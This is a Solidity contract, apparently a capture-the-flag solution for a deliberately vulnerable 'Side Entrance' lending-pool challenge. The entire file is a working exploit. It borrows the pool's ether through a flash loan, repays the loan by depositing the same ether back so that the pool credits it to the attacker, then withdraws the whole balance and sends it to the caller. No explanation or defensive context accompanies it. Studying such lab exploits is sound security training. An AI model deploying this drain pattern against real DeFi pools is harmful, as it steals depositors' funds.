// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceLenderPoolAttacker {
    address private immutable lenderPool;
    
    constructor(address pool) {
        lenderPool = pool;
    }

    function execute() external payable {
        ILenderPool pool = ILenderPool(lenderPool);
        pool.deposit{value : 1000 ether}();
    }

    function attack() external {
        ILenderPool(lenderPool).flashLoan(1000 ether);
        ILenderPool(lenderPool).withdraw();
        (bool success, ) = payable(msg.sender).call{value : address(this).balance}("");
        require(success, "Failed to withdraw from contract");
    }

    receive() external payable {}
}